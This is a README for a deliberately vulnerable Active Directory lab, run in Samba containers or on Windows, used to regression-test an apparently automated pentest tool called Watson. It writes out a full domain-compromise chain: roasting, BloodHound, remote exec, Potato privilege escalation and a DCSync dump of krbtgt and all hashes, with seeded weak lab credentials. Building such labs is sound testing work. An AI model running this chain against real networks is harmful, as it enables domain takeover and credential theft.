# Watson AD lab — a reproducible domain for the Windows / Active Directory chain

A small, self-contained Active Directory environment for exercising Watson's
`ad_recon` → roast → BloodHound → `ad_exec` → `win_privesc_scan` → secretsdump /
DCSync chain end to end. It gives every step something concrete to find: a
Kerberoastable service account, an AS-REP-roastable user, local-admin-equivalent
groups, a reused credential, and a host whose token privileges lead to SYSTEM.

> **Authorization.** This lab is for *your own* isolated network only. Point Watson at
> it with `scope.lab.yaml` (already scopes the lab subnet), never at anything else.
> Keep it off routable networks — the accounts below use weak, well-known passwords.

There are two paths. Use the **container path** for the network-driven chain (enum,
roasting, BloodHound) with one `docker compose up`; use the **Windows path** when you
want full fidelity — real DCSync `secretsdump` and the SeImpersonate→Potato local
privesc that `win_privesc_scan` matches.

| Watson step | Tool | Container (Samba) | Windows DC |
|---|---|:--:|:--:|
| SMB/LDAP enum, shares, users, pass-pol | `ad_recon` | ✅ | ✅ |
| Kerberoasting (SPN accounts) | `ad_recon roast=true` | ✅ | ✅ |
| AS-REP roasting (no-preauth users) | `ad_recon roast=true` | ✅ | ✅ |
| BloodHound graph collection | `ad_recon bloodhound=true` | ✅ | ✅ |
| Remote command execution | `ad_exec` | ⚠️¹ | ✅ |
| Local token-privilege privesc | `win_privesc_scan` | ❌² | ✅ |
| Local SAM dump | `ad_exec dump=true` | ⚠️¹ | ✅ |
| DCSync (whole-domain secrets) | `ad_exec dump=true just_dc=true` | ⚠️³ | ✅ |

¹ Samba AD DC has no Windows service-control / admin shares, so `nxc -x` exec and local
SAM dumping don't behave like Windows. ² Token-privilege privesc is a Windows-host
concept — there is no Samba equivalent. ³ Samba's DRSUAPI/DCSync support is partial and
version-dependent; treat a successful dump as a bonus, not a guarantee.

---

## Container path — Samba AD DC (fast, no Windows licence)

Provisions domain **`CORP.LAB.LOCAL`** (NetBIOS `CORP`) on a single DC and seeds it.

```bash
cd labs/ad
docker compose up -d --build        # first run provisions the domain, then seeds it
docker compose logs -f dc           # watch for "AD lab seeded"
```

The DC listens on **10.13.37.10** (SMB/LDAP/Kerberos/DNS) on the compose `lab` network.

> **Docker Desktop (Windows / macOS):** container IPs aren't routable from the host, and
> `netexec` won't `pip install` on Python 3.14. Run the AD tools from a Linux container on
> the same network and point Watson at it as its Exegol container — then `nxc`/impacket/
> bloodhound reach the DC directly:
> ```bash
> docker run -d --name watson-tools --network ad_lab python:3.12-slim sleep infinity
> docker exec watson-tools sh -lc "apt-get update && apt-get install -y git build-essential python3-dev libffi-dev libssl-dev \
>   && pip install 'git+https://github.com/Pennyw0rth/NetExec.git' impacket bloodhound"
> export EXEGOL_CONTAINER=watson-tools    # Watson shells AD tools into this container
> ```
> On Linux you can instead add a `ports:` block to the compose service and target the host.

Point Watson at the DC:

```bash
cp labs/ad/scope.lab.yaml scope.yaml
watson rag build --techniques        # once, to populate GTFOBins/LOLBAS + CVEs

# unauthenticated enum (null session) — users, shares, password policy
watson assess 10.13.37.10 --scope scope.yaml --exploit
```

…or drive the chain by hand through the bridge / web console:

```text
ad_recon  target=10.13.37.10                                   # null-session enum → user list
ad_recon  target=10.13.37.10 domain=CORP user=jmiller password=Summer2024! roast=true
                                                               # kerberoast svc_sql, asrep preauth_less
ad_recon  target=10.13.37.10 domain=CORP user=jmiller password=Summer2024! bloodhound=true
                                                               # collect the graph (shortest path to DA)
ad_exec   target=10.13.37.10 domain=CORP user=Administrator password=Lab_Admin_2024! dump=true just_dc=true
                                                               # DCSync → krbtgt (objective reached)
```

**Seeded objects** (see `seed.sh`):

- `svc_sql` — Kerberoastable (SPN `MSSQLSvc/dc01.corp.lab.local:1433`), password `Summer2024!`.
- `preauth_less` — AS-REP-roastable (no Kerberos pre-auth), password `P@ssw0rd!`.
- `jmiller` — ordinary domain user; its password **also works for** `svc_sql`
  (a deliberate **credential-reuse** edge for the agent to notice).
- `backupop` — member of **Backup Operators**; `dnsadm` — member of **DnsAdmins**
  (both local-admin-equivalent groups `win_privesc_scan` flags).
- `Administrator` — domain admin, password `Lab_Admin_2024!` (the goal: reach it).

Tear down with `docker compose down -v` (the `-v` wipes the provisioned domain).

---

## Windows path — full fidelity (real DC + a member host)

Use this for the parts Samba can't reproduce: DCSync `secretsdump`, Windows remote
exec, and the SeImpersonate / SeBackup token-privilege escalation that
`win_privesc_scan` is built to match.

1. Stand up a Windows Server DC + at least one domain-joined member (any of):
   - **[GOAD](https://github.com/Orange-Cyberdefense/GOAD)** or **[Ludus](https://ludus.cloud)** — full pre-built AD ranges (recommended).
   - A manual lab: `Install-ADDSForest -DomainName corp.lab.local` on Server 2019/2022,
     then join one member server.
2. On the DC, seed the roastable/credential-reuse objects and groups:
   ```powershell
   .\seed-dc.ps1                       # run as Domain Admin on the DC
   ```
3. On the **member host**, grant a low-privileged test user the token privileges that
   lead to SYSTEM, so `win_privesc_scan` has something to match:
   ```powershell
   .\seed-dc.ps1 -MemberPrivesc        # run as local admin on the member server
   ```
   This grants `svc_web` **SeImpersonatePrivilege** (→ Potato → SYSTEM) and
   **SeBackupPrivilege** (→ hive dump), matching `PRIV_TECHNIQUES` in `watson/winprivesc.py`.

Then scope both hosts and run the chain:

```text
ad_recon         target=<DC-ip> domain=CORP user=jmiller password=Summer2024! roast=true bloodhound=true
ad_exec          target=<member-ip> domain=CORP user=svc_web password=Summer2024! command=whoami
win_privesc_scan target=<member-ip> domain=CORP user=svc_web password=Summer2024!
                 #  → SeImpersonatePrivilege (Potato → SYSTEM), SeBackupPrivilege (hive dump)
ad_exec          target=<DC-ip> domain=CORP user=Administrator password=Lab_Admin_2024! dump=true just_dc=true
                 #  → DCSync: krbtgt + all NT hashes  (Domain Admin / krbtgt = objective)
```

Edit the IPs in `scope.lab.yaml` to match your range (it defaults to `10.13.37.0/24`).

---

## What "reproducible" buys you

Every account, SPN, group and privilege above is created by a script in this folder, so
a fresh `docker compose up` (or `seed-dc.ps1`) always yields the **same** findable path
to Domain Admin. That makes the AD chain a stable regression target: if a Watson change
breaks `ad_recon`'s roasting output or `win_privesc_scan`'s matching, you notice it here
before a real engagement.
